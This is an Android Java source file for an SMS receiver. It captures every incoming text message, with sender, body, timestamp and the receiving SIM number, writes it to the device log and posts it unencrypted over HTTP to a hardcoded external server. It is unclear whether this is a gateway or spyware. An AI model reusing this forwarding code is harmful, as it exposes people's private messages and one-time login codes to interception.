package com.sms.smsservice;

import android.Manifest;
import android.content.BroadcastReceiver;
import android.content.Context;
import android.content.Intent;
import android.content.pm.PackageManager;
import android.os.Build;
import android.os.Bundle;
import android.telephony.SmsMessage;
import android.telephony.SubscriptionInfo;
import android.telephony.SubscriptionManager;
import android.util.Log;
import android.widget.Toast;

import androidx.annotation.RequiresApi;
import androidx.core.app.ActivityCompat;

import java.io.IOException;
import java.io.OutputStream;
import java.net.HttpURLConnection;
import java.net.MalformedURLException;
import java.net.URL;
import java.util.List;
public class SmsReceiver extends BroadcastReceiver {

    @RequiresApi(api = Build.VERSION_CODES.O)
    @Override
    public void onReceive(Context context, Intent intent) {

        String msg = "", fr = null, to = null;
        Long receivetime = null;
        SmsMessage[] msgs;

        Bundle bundle = intent.getExtras();
        int slotindex = bundle.getInt("slot");
        Object[] pdus = (Object[]) bundle.get("pdus");

        msgs = new SmsMessage[pdus.length];
        for(int i=0; i < msgs.length; i++){
            msgs[i] = SmsMessage.createFromPdu((byte[]) pdus[i]);
            if ( fr == null){ fr = msgs[i].getDisplayOriginatingAddress();}
            if ( to == null){to = this.getPhoneNumberOfSlotIndex(context, slotindex);}
            msg += msgs[i].getDisplayMessageBody();
            receivetime = msgs[i].getTimestampMillis();
        }
        Log.d("sms-sreveice", String.format("onReceive: From: %s; To: %s; Msg: %s", fr, to, msg));

        String finalFr = fr;
        String finalTo = to;
        String finalMsg = msg;
        Long finalReceivetime = receivetime;
        new Thread(new Runnable() {
            @Override
            public void run() {
                this.reportSmsMessage(finalFr, finalTo, finalMsg, finalReceivetime);
            }

            private void reportSmsMessage(String fr, String to, String msg, Long rtime){
                try {
                    URL url = new URL("http://imessage.seechat.cc/sms/index/smsReceive.html");
                    HttpURLConnection http = (HttpURLConnection)url.openConnection();
                    http.setRequestMethod("POST");
                    http.setConnectTimeout(5000);
                    http.setRequestProperty("charset", "utf-8");

                    String data = String.format("s=%s&d=%s&msg=%s&rtime=%s", fr, to, msg, rtime);
                    http.setDoOutput(true);
                    OutputStream outputStream = http.getOutputStream();
                    outputStream.write(data.getBytes());

                    int nrc = http.getResponseCode();
                    Log.d("sms-service", "reportSmsMessage: " + nrc);
                } catch (MalformedURLException e) {
                    e.printStackTrace();
                } catch (IOException e) {
                    e.printStackTrace();
                }

            }
        }).start();
        Toast.makeText(context, msg, Toast.LENGTH_LONG).show();
    }

    private String getPhoneNumberOfSlotIndex(Context context, int slotindex){
        String ret = "";
        // Get phone numbers
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.LOLLIPOP_MR1) {
            SubscriptionManager sm = SubscriptionManager.from(context);
            if (ActivityCompat.checkSelfPermission(context, Manifest.permission.READ_PHONE_STATE) != PackageManager.PERMISSION_GRANTED) {
                // TODO: Consider calling
                //    ActivityCompat#requestPermissions
                // here to request the missing permissions, and then overriding
                //   public void onRequestPermissionsResult(int requestCode, String[] permissions,
                //                                          int[] grantResults)
                // to handle the case where the user grants the permission. See the documentation
                // for ActivityCompat#requestPermissions for more details.
                Log.e("sms-service-permission", "onStart: SubscriptionInfo no permission");
                return "";
            }
            List<SubscriptionInfo> sis = sm.getActiveSubscriptionInfoList();
            for( SubscriptionInfo si : sis){
                if ( si.getSimSlotIndex() == slotindex){
                    ret = si.getNumber();
                }
            }
            return ret;
        }
        return "";
    }


}